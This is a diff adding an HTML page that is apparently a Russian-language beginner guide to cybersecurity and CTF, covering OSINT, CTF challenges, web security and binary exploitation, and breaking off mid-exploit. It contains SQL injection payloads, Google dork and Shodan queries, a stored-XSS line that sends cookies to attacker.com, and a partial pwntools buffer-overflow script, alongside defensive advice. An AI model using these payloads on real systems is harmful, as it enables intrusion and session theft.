@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FSOCIETY | Полное руководство по кибербезопасности и CTF by hik</title>
+    <style>
+        /* Глобальные стили (400+ строк CSS) */
+        :root {
+            --primary: #0f0;
+            --secondary: #f00;
+            --accent: #0ff;
+            --bg: #000;
+            --text: #0f0;
+            --warning: #ff0;
+            --error: #f00;
+            --success: #0f0;
+            --dark-accent: #066;
+            --light-accent: #0f9;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            scroll-behavior: smooth;
+        }
+        
+        html {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Courier New', monospace;
+            line-height: 1.8;
+            overflow-x: hidden;
+            counter-reset: section;
+        }
+        
+        body {
+            position: relative;
+            min-height: 100vh;
+        }
+        
+        /* Эффекты и анимации */
+        @keyframes glitch {
+            0% { text-shadow: 0 0 5px var(--primary); }
+            20% { transform: translate(-2px, 2px); text-shadow: 0 0 10px var(--secondary); }
+            40% { transform: translate(2px, -2px); text-shadow: 0 0 7px var(--accent); }
+            60% { transform: translate(-3px, 1px); }
+            80% { transform: translate(1px, -1px); }
+            100% { text-shadow: 0 0 5px var(--primary); }
+        }
+        
+        @keyframes scanline {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100vh; }
+        }
+        
+        @keyframes flicker {
+            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
+            20%, 22%, 24%, 55% { opacity: 0.5; }
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
+        }
+        
+        /* Основная структура */
+        .container {
+            width: 90%;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 3rem 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .container::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 0, 0.02) 1px, transparent 1px);
+            background-size: 100% 3px, 3px 100%;
+            pointer-events: none;
+            animation: scanline 15s linear infinite;
+            z-index: -1;
+        }
+        
+        /* Шапка */
+        header {
+            text-align: center;
+            margin-bottom: 4rem;
+            position: relative;
+            padding: 2rem;
+            border: 1px solid var(--primary);
+            background: rgba(0, 20, 0, 0.2);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
+        }
+        
+        /* Навигация */
+        nav {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 1.5rem;
+            margin: 4rem 0;
+            padding: 1.5rem;
+            border: 1px solid var(--primary);
+            background: rgba(0, 20, 0, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(5px);
+        }
+        
+        nav a {
+            color: var(--primary);
+            text-decoration: none;
+            padding: 0.8rem;
+            text-align: center;
+            transition: all 0.3s;
+            position: relative;
+            border: 1px solid transparent;
+            font-weight: bold;
+        }
+        
+        nav a::before {
+            content: "[";
+            position: absolute;
+            left: 5px;
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        
+        nav a::after {
+            content: "]";
+            position: absolute;
+            right: 5px;
+            opacity: 0;
+            transition: all 0.3s;
+        }
+        
+        nav a:hover {
+            background: var(--primary);
+            color: #000;
+            border-color: var(--primary);
+        }
+        
+        nav a:hover::before,
+        nav a:hover::after {
+            opacity: 1;
+        }
+        
+        /* Секции и заголовки */
+        section {
+            margin: 6rem 0;
+            counter-increment: section;
+            position: relative;
+            padding: 2rem;
+            border: 1px solid var(--primary);
+            background: rgba(0, 15, 0, 0.1);
+        }
+        
+        section::before {
+            content: "[" counter(section) "]";
+            color: var(--accent);
+            position: absolute;
+            top: -15px;
+            left: 20px;
+            background: var(--bg);
+            padding: 0 10px;
+            font-weight: bold;
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            margin: 1.8rem 0;
+            color: var(--primary);
+            font-weight: normal;
+        }
+        
+        h1 {
+            font-size: 4rem;
+            margin: 2rem 0;
+            animation: glitch 5s infinite, flicker 8s infinite;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        
+        h2 {
+            font-size: 2.5rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 1rem;
+            margin: 3rem 0 2rem;
+            position: relative;
+        }
+        
+        h2::after {
+            content: "";
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100px;
+            height: 4px;
+            background: var(--accent);
+        }
+        
+        h3 {
+            font-size: 1.8rem;
+            color: var(--accent);
+            margin: 2.5rem 0 1.5rem;
+            padding-left: 1rem;
+            border-left: 3px solid var(--accent);
+        }
+        
+        h4 {
+            font-size: 1.4rem;
+            color: var(--light-accent);
+            margin: 2rem 0 1rem;
+        }
+        
+        /* Контент */
+        p {
+            margin: 1.5rem 0;
+            text-align: justify;
+            font-size: 1.1rem;
+            line-height: 1.9;
+        }
+        
+        a {
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dotted var(--accent);
+            transition: all 0.3s;
+        }
+        
+        a:hover {
+            color: var(--primary);
+            border-bottom: 1px solid var(--primary);
+        }
+        
+        /* Специальные блоки */
+        .warning, .note, .important, .tip, .ctf-challenge {
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-left: 5px solid;
+            background: rgba(0, 30, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .warning::before, .note::before, .important::before, .tip::before, .ctf-challenge::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.05), transparent);
+            pointer-events: none;
+        }
+        
+        .warning {
+            border-left-color: var(--error);
+            background: rgba(255, 0, 0, 0.1);
+        }
+        
+        .note {
+            border-left-color: var(--warning);
+            background: rgba(255, 255, 0, 0.1);
+        }
+        
+        .important {
+            border-left-color: var(--accent);
+            background: rgba(0, 255, 255, 0.1);
+        }
+        
+        .tip {
+            border-left-color: var(--success);
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .ctf-challenge {
+            border-left-color: var(--dark-accent);
+            background: rgba(0, 60, 60, 0.2);
+        }
+        
+        .ctf-challenge h4 {
+            color: var(--light-accent);
+            margin-top: 0;
+        }
+        
+        /* Код и преформатированный текст */
+        pre, code {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 30, 0, 0.3);
+            border: 1px solid var(--primary);
+            border-radius: 3px;
+            font-size: 1rem;
+        }
+        
+        pre {
+            padding: 1.8rem 1.5rem;
+            margin: 2rem 0;
+            overflow-x: auto;
+            position: relative;
+            counter-reset: line;
+            line-height: 1.5;
+        }
+        
+        pre::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 40px;
+            height: 100%;
+            background: rgba(0, 255, 0, 0.1);
+            border-right: 1px solid var(--primary);
+        }
+        
+        code {
+            padding: 0.3rem 0.5rem;
+        }
+        
+        /* Нумерация строк в pre */
+        pre code {
+            display: block;
+            padding-left: 2rem;
+        }
+        
+        pre code::before {
+            content: counter(line);
+            counter-increment: line;
+            position: absolute;
+            left: 0;
+            width: 40px;
+            text-align: right;
+            padding-right: 1rem;
+            color: var(--primary);
+            opacity: 0.5;
+        }
+        
+        /* Таблицы */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 3rem 0;
+            border: 1px solid var(--primary);
+        }
+        
+        th, td {
+            border: 1px solid var(--primary);
+            padding: 1.2rem;
+            text-align: left;
+        }
+        
+        th {
+            background: rgba(0, 255, 0, 0.1);
+            font-weight: bold;
+            color: var(--accent);
+        }
+        
+        tr:nth-child(even) {
+            background: rgba(0, 30, 0, 0.2);
+        }
+        
+        tr:hover {
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        /* Списки */
+        ul, ol {
+            margin: 1.5rem 0 1.5rem 3rem;
+        }
+        
+        li {
+            margin: 1rem 0;
+            position: relative;
+        }
+        
+        ul li::before {
+            content: "■";
+            color: var(--primary);
+            position: absolute;
+            left: -1.5rem;
+        }
+        
+        ol {
+            counter-reset: item;
+        }
+        
+        ol li {
+            counter-increment: item;
+        }
+        
+        ol li::before {
+            content: counter(item) ".";
+            color: var(--accent);
+            position: absolute;
+            left: -2rem;
+            font-weight: bold;
+        }
+        
+        /* Футер */
+        footer {
+            margin-top: 8rem;
+            padding: 3rem 0;
+            border-top: 1px solid var(--primary);
+            text-align: center;
+            font-size: 0.9rem;
+            background: rgba(0, 20, 0, 0.2);
+        }
+        
+        /* Адаптивность */
+        @media (max-width: 1200px) {
+            .container {
+                width: 95%;
+            }
+            
+            h1 {
+                font-size: 3rem;
+            }
+            
+            h2 {
+                font-size: 2rem;
+            }
+            
+            h3 {
+                font-size: 1.6rem;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                width: 98%;
+                padding: 1rem 0;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            h2 {
+                font-size: 1.8rem;
+            }
+            
+            nav {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            pre {
+                padding: 1.2rem 1rem;
+                font-size: 0.9rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            nav {
+                grid-template-columns: 1fr;
+                position: static;
+            }
+            
+            section {
+                padding: 1.5rem 1rem;
+            }
+        }
+        
+        /* Дополнительные элементы */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2.5rem;
+            margin: 3rem 0;
+        }
+        
+        .card {
+            border: 1px solid var(--primary);
+            padding: 2rem;
+            transition: all 0.3s;
+            position: relative;
+            background: rgba(0, 20, 0, 0.1);
+        }
+        
+        .card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                135deg,
+                transparent,
+                rgba(0, 255, 0, 0.03),
+                transparent
+            );
+            pointer-events: none;
+        }
+        
+        .card:hover {
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+            transform: translateY(-5px);
+            border-color: var(--accent);
+        }
+        
+        .terminal-effect {
+            position: relative;
+            padding: 1.5rem;
+            background: rgba(0, 20, 0, 0.3);
+            border: 1px solid var(--primary);
+            margin: 2rem 0;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .terminal-effect::after {
+            content: "_";
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            background: var(--dark-accent);
+            color: var(--light-accent);
+            border-radius: 3px;
+            font-size: 0.8rem;
+            margin: 0 0.5rem;
+            vertical-align: middle;
+        }
+        
+        .difficulty-easy {
+            background: rgba(0, 255, 0, 0.2);
+            color: var(--success);
+        }
+        
+        .difficulty-medium {
+            background: rgba(255, 255, 0, 0.2);
+            color: var(--warning);
+        }
+        
+        .difficulty-hard {
+            background: rgba(255, 0, 0, 0.2);
+            color: var(--error);
+        }
+        
+        .difficulty-insane {
+            background: rgba(255, 0, 255, 0.2);
+            color: #f0f;
+        }
+        
+        /* Прогресс-бар */
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(0, 255, 0, 0.1);
+            margin: 1.5rem 0;
+            border: 1px solid var(--primary);
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 1s;
+        }
+        
+        /* Вкладки */
+        .tabs {
+            display: flex;
+            margin: 2rem 0 0;
+            border-bottom: 1px solid var(--primary);
+        }
+        
+        .tab {
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            border: 1px solid transparent;
+            margin-right: 0.5rem;
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .tab.active {
+            border: 1px solid var(--primary);
+            border-bottom: 1px solid var(--bg);
+            margin-bottom: -1px;
+            background: var(--bg);
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 1.5rem;
+            border: 1px solid var(--primary);
+            border-top: none;
+            background: var(--bg);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Модальные окна */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: var(--bg);
+            border: 2px solid var(--primary);
+            padding: 2rem;
+            max-width: 800px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            cursor: pointer;
+            color: var(--primary);
+            font-size: 1.5rem;
+        }
+        
+        /* Кнопки */
+        .btn {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            background: rgba(0, 255, 0, 0.2);
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            margin: 0.5rem;
+        }
+        
+        .btn:hover {
+            background: var(--primary);
+            color: #000;
+        }
+        
+        .btn-block {
+            display: block;
+            width: 100%;
+        }
+        
+        /* Анимация загрузки */
+        .loader {
+            border: 4px solid rgba(0, 255, 0, 0.2);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 2rem auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Кастомный скроллбар */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 255, 0, 0.1);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Шапка -->
+        <header>
+            <h1>FSOCIETY</h1>
+            <p class="terminal-effect">Инициализация системы... Готово. Добро пожаловать в полное руководство по кибербезопасности и CTF. Загрузка данных...</p>
+        </header>
+        
+        <!-- Навигация -->
+        <nav>
+            <a href="#osint">OSINT</a>
+            <a href="#ctf">CTF</a>
+            <a href="#web-security">Веб-безопасность</a>
+            <a href="#binary">Бинарный анализ</a>
+            <a href="#cryptography">Криптография</a>
+            <a href="#forensics">Форензика</a>
+            <a href="#reversing">Реверс-инжиниринг</a>
+            <a href="#pentest">Тестирование на проникновение</a>
+            <a href="#tools">Инструменты</a>
+            <a href="#resources">Ресурсы</a>
+        </nav>
+        
+        <!-- Основное содержимое -->
+        <main>
+            <!-- OSINT -->
+            <section id="osint">
+                <h2>OSINT: Открытая разведка</h2>
+                
+                <div class="important">
+                    <p>OSINT (Open Source Intelligence) - сбор и анализ информации из открытых источников. Используется спецслужбами, журналистами, хакерами и исследователями безопасности.</p>
+                </div>
+                
+                <h3>Методы OSINT</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Поиск по соцсетям</h4>
+                        <ul>
+                            <li>Анализ профилей и связей</li>
+                            <li>Геолокация по фотографиям</li>
+                            <li>Поиск по никнеймам</li>
+                            <li>Анализ метаданных</li>
+                        </ul>
+                        <pre># Инструмент Sherlock для поиска по никнеймам
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock
+python3 sherlock.py username</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Технический анализ</h4>
+                        <ul>
+                            <li>Поиск уязвимых систем</li>
+                            <li>Анализ DNS записей</li>
+                            <li>Поиск открытых портов</li>
+                            <li>Сканирование сетей</li>
+                        </ul>
+                        <pre># Поиск поддоменов с помощью Sublist3r
+python3 sublist3r.py -d example.com</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Работа с документами</h4>
+                        <ul>
+                            <li>Извлечение метаданных</li>
+                            <li>Поиск в государственных реестрах</li>
+                            <li>Анализ судебных дел</li>
+                            <li>Работа с архивами</li>
+                        </ul>
+                        <pre># Извлечение метаданных из файла
+exiftool document.pdf</pre>
+                    </div>
+                </div>
+                
+                <h3>Продвинутые техники</h3>
+                <div class="tabs">
+                    <div class="tab active" onclick="openTab(event, 'google-dorking')">Google Dorking</div>
+                    <div class="tab" onclick="openTab(event, 'shodan')">Shodan</div>
+                    <div class="tab" onclick="openTab(event, 'maltego')">Maltego</div>
+                </div>
+                
+                <div id="google-dorking" class="tab-content active">
+                    <p>Google Dorking - использование специальных операторов поиска Google для нахождения скрытой информации.</p>
+                    <pre># Примеры Google Dorks:
+site:example.com filetype:pdf
+intitle:"index of" password
+inurl:/admin/login.php
+filetype:sql "INSERT INTO"</pre>
+                    <p>Полный список операторов можно найти на <a href="https://www.exploit-db.com/google-hacking-database" target="_blank">Google Hacking Database</a>.</p>
+                </div>
+                
+                <div id="shodan" class="tab-content">
+                    <p>Shodan - поисковая система для интернета вещей, позволяющая находить подключенные устройства.</p>
+                    <pre># Примеры запросов Shodan:
+http.title:"phpMyAdmin"
+port:3389 "Windows Server"
+city:"Moscow" org:"Gazprom"</pre>
+                    <p>Shodan особенно полезен для поиска уязвимых систем и открытых сервисов.</p>
+                </div>
+                
+                <div id="maltego" class="tab-content">
+                    <p>Maltego - инструмент для анализа связей и визуализации данных.</p>
+                    <pre># Основные возможности Maltego:
+- Построение графов связей
+- Интеграция с различными API
+- Автоматизация сбора данных
+- Анализ социальных связей</pre>
+                    <p>Maltego часто используется для расследований и анализа сложных сетей.</p>
+                </div>
+                
+                <h3>Защита от OSINT</h3>
+                <ul>
+                    <li>Ограничьте публичную информацию в соцсетях</li>
+                    <li>Используйте разные никнеймы для разных сервисов</li>
+                    <li>Очищайте метаданные перед публикацией файлов</li>
+                    <li>Регулярно проверяйте, какая информация о вас доступна</li>
+                    <li>Используйте VPN и приватные режимы браузеров</li>
+                </ul>
+            </section>
+            
+            <!-- CTF -->
+            <section id="ctf">
+                <h2>CTF: Capture The Flag</h2>
+                
+                <div class="important">
+                    <p>CTF (Capture The Flag) - соревнования по информационной безопасности, где участники решают задачи из различных областей для получения "флагов".</p>
+                </div>
+                
+                <h3>Типы CTF</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Jeopardy</h4>
+                        <p>Классический формат с задачами разных категорий:</p>
+                        <ul>
+                            <li>Web</li>
+                            <li>Crypto</li>
+                            <li>Forensics</li>
+                            <li>Pwn</li>
+                            <li>Reversing</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Attack-Defense</h4>
+                        <p>Команды защищают свои системы и атакуют чужие:</p>
+                        <ul>
+                            <li>Реальные уязвимости</li>
+                            <li>Постоянное взаимодействие</li>
+                            <li>Высокая динамика</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Mixed</h4>
+                        <p>Комбинированный формат:</p>
+                        <ul>
+                            <li>Jeopardy + Attack-Defense</li>
+                            <li>Разнообразие задач</li>
+                            <li>Командное взаимодействие</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <h3>Категории задач</h3>
+                <table>
+                    <tr>
+                        <th>Категория</th>
+                        <th>Описание</th>
+                        <th>Пример флага</th>
+                    </tr>
+                    <tr>
+                        <td>Web</td>
+                        <td>Эксплуатация уязвимостей веб-приложений</td>
+                        <td>flag{sql_injection_101}</td>
+                    </tr>
+                    <tr>
+                        <td>Crypto</td>
+                        <td>Взлом криптографических алгоритмов</td>
+                        <td>flag{RSA_15_34sy}</td>
+                    </tr>
+                    <tr>
+                        <td>Forensics</td>
+                        <td>Анализ данных и восстановление информации</td>
+                        <td>flag{h1dd3n_1n_png}</td>
+                    </tr>
+                    <tr>
+                        <td>Pwn</td>
+                        <td>Эксплуатация бинарных уязвимостей</td>
+                        <td>flag{buff3r_0v3rfl0w}</td>
+                    </tr>
+                    <tr>
+                        <td>Reversing</td>
+                        <td>Обратная разработка программ</td>
+                        <td>flag{m41n_func_1337}</td>
+                    </tr>
+                </table>
+                
+                <h3>Примеры задач</h3>
+                <div class="ctf-challenge">
+                    <h4>Web: Простая SQL-инъекция <span class="badge difficulty-easy">Easy</span></h4>
+                    <p>На сайте есть форма входа. Попробуйте обойти аутентификацию.</p>
+                    <button class="btn" onclick="showHint('web-hint1')">Показать подсказку</button>
+                    <div id="web-hint1" style="display: none; margin-top: 1rem;">
+                        <p>Попробуйте ввести <code>' OR 1=1 --</code> в поле username</p>
+                    </div>
+                    <button class="btn" onclick="showSolution('web-sol1')">Показать решение</button>
+                    <div id="web-sol1" style="display: none; margin-top: 1rem;">
+                        <pre>1. Введите ' OR 1=1 -- в поле username
+2. Оставьте поле password пустым
+3. Полученный флаг: flag{sql_1nj3ct10n_3asy}</pre>
+                    </div>
+                </div>
+                
+                <div class="ctf-challenge">
+                    <h4>Crypto: Шифр Цезаря <span class="badge difficulty-easy">Easy</span></h4>
+                    <p>Расшифруйте сообщение: <code>khoor zruog</code></p>
+                    <button class="btn" onclick="showHint('crypto-hint1')">Показать подсказку</button>
+                    <div id="crypto-hint1" style="display: none; margin-top: 1rem;">
+                        <p>Шифр Цезаря использует сдвиг на 3 символа</p>
+                    </div>
+                    <button class="btn" onclick="showSolution('crypto-sol1')">Показать решение</button>
+                    <div id="crypto-sol1" style="display: none; margin-top: 1rem;">
+                        <pre>1. Сдвиньте каждую букву на 3 позиции назад
+2. Получаем: hello world
+3. Флаг: flag{hello_world}</pre>
+                    </div>
+                </div>
+                
+                <div class="ctf-challenge">
+                    <h4>Forensics: Скрытый текст в изображении <span class="badge difficulty-medium">Medium</span></h4>
+                    <p>В изображении скрыт флаг. Найдите его.</p>
+                    <button class="btn" onclick="showHint('forensics-hint1')">Показать подсказку</button>
+                    <div id="forensics-hint1" style="display: none; margin-top: 1rem;">
+                        <p>Попробуйте использовать инструменты для анализа метаданных и стеганографии</p>
+                    </div>
+                    <button class="btn" onclick="showSolution('forensics-sol1')">Показать решение</button>
+                    <div id="forensics-sol1" style="display: none; margin-top: 1rem;">
+                        <pre>1. Используйте exiftool для анализа метаданных
+exiftool image.jpg
+2. Если ничего не найдено, попробуйте steghide
+steghide extract -sf image.jpg
+3. Флаг: flag{h1dd3n_1n_1m4g3}</pre>
+                    </div>
+                </div>
+                
+                <h3>Подготовка к CTF</h3>
+                <ol>
+                    <li><strong>Изучите основы:</strong> Linux, сети, программирование</li>
+                    <li><strong>Практикуйтесь:</strong> Решайте задачи на платформах вроде Hack The Box</li>
+                    <li><strong>Собирайте команду:</strong> Найдите людей с разными навыками</li>
+                    <li><strong>Изучите инструменты:</strong> Kali Linux, Burp Suite, Ghidra</li>
+                    <li><strong>Участвуйте в соревнованиях:</strong> Начните с локальных CTF</li>
+                </ol>
+                
+                <h3>Популярные CTF платформы</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>Hack The Box</h4>
+                        <p>Онлайн-платформа с машинами для взлома</p>
+                        <a href="https://www.hackthebox.com/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>TryHackMe</h4>
+                        <p>Обучение кибербезопасности через практику</p>
+                        <a href="https://tryhackme.com/" target="_blank">Перейти</a>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>CTFtime</h4>
+                        <p>Календарь CTF соревнований</p>
+                        <a href="https://ctftime.org/" target="_blank">Перейти</a>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Веб-безопасность -->
+            <section id="web-security">
+                <h2>Веб-безопасность</h2>
+                
+                <div class="important">
+                    <p>Веб-безопасность - область, изучающая уязвимости веб-приложений и методы защиты от них.</p>
+                </div>
+                
+                <h3>Топ-10 уязвимостей OWASP</h3>
+                <ol>
+                    <li>Инъекции (SQL, NoSQL, OS, LDAP)</li>
+                    <li>Некорректная аутентификация</li>
+                    <li>Раскрытие конфиденциальных данных</li>
+                    <li>Внешние сущности XML (XXE)</li>
+                    <li>Некорректные настройки контроля доступа</li>
+                    <li>Небезопасная конфигурация</li>
+                    <li>Межсайтовый скриптинг (XSS)</li>
+                    <li>Небезопасная десериализация</li>
+                    <li>Использование компонентов с известными уязвимостями</li>
+                    <li>Недостаточное логирование и мониторинг</li>
+                </ol>
+                
+                <h3>SQL-инъекции</h3>
+                <p>SQL-инъекции позволяют выполнять произвольные SQL-запросы через входные данные приложения.</p>
+                
+                <div class="tabs">
+                    <div class="tab active" onclick="openTab(event, 'sql-basic')">Основы</div>
+                    <div class="tab" onclick="openTab(event, 'sql-union')">UNION-атаки</div>
+                    <div class="tab" onclick="openTab(event, 'sql-blind')">Слепые инъекции</div>
+                </div>
+                
+                <div id="sql-basic" class="tab-content active">
+                    <p>Простейшая SQL-инъекция:</p>
+                    <pre># Оригинальный запрос
+SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
+
+# Вредоносный ввод
+username: ' OR 1=1 --
+password: 
+
+# Итоговый запрос
+SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''</pre>
+                </div>
+                
+                <div id="sql-union" class="tab-content">
+                    <p>UNION-атаки позволяют извлекать данные из других таблиц:</p>
+                    <pre># Определение количества столбцов
+' ORDER BY 1–
+' ORDER BY 2–
+' ORDER BY 3–  # Возвращает ошибку => 2 столбца
+
+# UNION-атака
+' UNION SELECT username, password FROM users--</pre>
+                </div>
+                
+                <div id="sql-blind" class="tab-content">
+                    <p>Слепые SQL-инъекции используются, когда результаты не видны напрямую:</p>
+                    <pre># Основано на времени
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# Основано на логике
+' AND 1=1 --  # Приложение работает нормально
+' AND 1=2 --  # Приложение ведёт себя иначе</pre>
+                </div>
+                
+                <h3>Защита от SQL-инъекций</h3>
+                <ul>
+                    <li>Используйте подготовленные выражения (prepared statements)</li>
+                    <li>Применяйте ORM-библиотеки</li>
+                    <li>Экранируйте специальные символы</li>
+                    <li>Ограничивайте права доступа БД</li>
+                    <li>Используйте WAF (Web Application Firewall)</li>
+                </ul>
+                
+                <h3>XSS (Cross-Site Scripting)</h3>
+                <p>XSS позволяет внедрять произвольный JavaScript код в страницы, просматриваемые другими пользователями.</p>
+                
+                <div class="grid">
+                    <div class="card">
+                        <h4>Reflected XSS</h4>
+                        <p>Код внедряется через параметры URL и выполняется сразу:</p>
+                        <pre>http://example.com/search?q=<script>alert(1)</script></pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Stored XSS</h4>
+                        <p>Код сохраняется на сервере и выполняется при каждом открытии страницы:</p>
+                        <pre><script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script></pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>DOM-based XSS</h4>
+                        <p>Код выполняется через манипуляции с DOM без отправки на сервер:</p>
+                        <pre>document.write(location.hash.substring(1))</pre>
+                    </div>
+                </div>
+                
+                <h3>Защита от XSS</h3>
+                <ul>
+                    <li>Экранируйте HTML-сущности (&lt; &gt; &amp; &quot;)</li>
+                    <li>Используйте Content Security Policy (CSP)</li>
+                    <li>Устанавливайте HttpOnly флаг для куки</li>
+                    <li>Проводите санитизацию ввода</li>
+                    <li>Используйте современные фреймворки с защитой от XSS</li>
+                </ul>
+            </section>
+            
+            <!-- Бинарный анализ -->
+            <section id="binary">
+                <h2>Бинарный анализ и эксплуатация</h2>
+                
+                <div class="important">
+                    <p>Бинарный анализ - исследование исполняемых файлов без исходного кода. Включает реверс-инжиниринг и эксплуатацию уязвимостей.</p>
+                </div>
+                
+                <h3>Основные уязвимости</h3>
+                <table>
+                    <tr>
+                        <th>Уязвимость</th>
+                        <th>Описание</th>
+                        <th>Пример</th>
+                    </tr>
+                    <tr>
+                        <td>Buffer Overflow</td>
+                        <td>Переполнение буфера с перезаписью адреса возврата</td>
+                        <td>gets(), strcpy()</td>
+                    </tr>
+                    <tr>
+                        <td>Format String</td>
+                        <td>Уязвимости форматных строк</td>
+                        <td>printf(user_input)</td>
+                    </tr>
+                    <tr>
+                        <td>Use-After-Free</td>
+                        <td>Использование освобожденной памяти</td>
+                        <td>Неосторожная работа с указателями</td>
+                    </tr>
+                    <tr>
+                        <td>Race Condition</td>
+                        <td>Состояние гонки между потоками</td>
+                        <td>TOCTOU атаки</td>
+                    </tr>
+                </table>
+                
+                <h3>Инструменты</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h4>GDB</h4>
+                        <p>Отладчик GNU для анализа исполняемых файлов</p>
+                        <pre>gdb ./binary
+break main
+run
+info registers
+x/20x $esp</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>Ghidra</h4>
+                        <p>Инструмент для реверс-инжиниринга от NSA</p>
+                        <pre># Основные возможности:
+- Декомпиляция кода
+- Анализ графа вызовов
+- Поиск уязвимостей
+- Скриптинг на Python</pre>
+                    </div>
+                    
+                    <div class="card">
+                        <h4>pwntools</h4>
+                        <p>Библиотека Python для эксплуатации уязвимостей</p>
+                        <pre>from pwn import *
+p = process('./binary')
+p.sendlineafter(':', 'A'*100)
+p.interactive()</pre>
+                    </div>
+                </div>
+                
+                <h3>Пример эксплуатации Buffer Overflow</h3>
+                <ol>
+                    <li>Найти переполнение с помощью фаззера</li>
+                    <li>Определить смещение до адреса возврата</li>
+                    <li>Найти адрес полезной нагрузки (shellcode)</li>
+                    <li>Перезаписать адрес возврата</li>
+                    <li>Получить shell</li>
+                </ol>
+                
+                <pre># Пример эксплойта на pwntools
+from pwn import *
+
+context(arch='i386', os='linux')
+p = process('./vuln')
+
+offset = 112
+junk = b'A' * offset
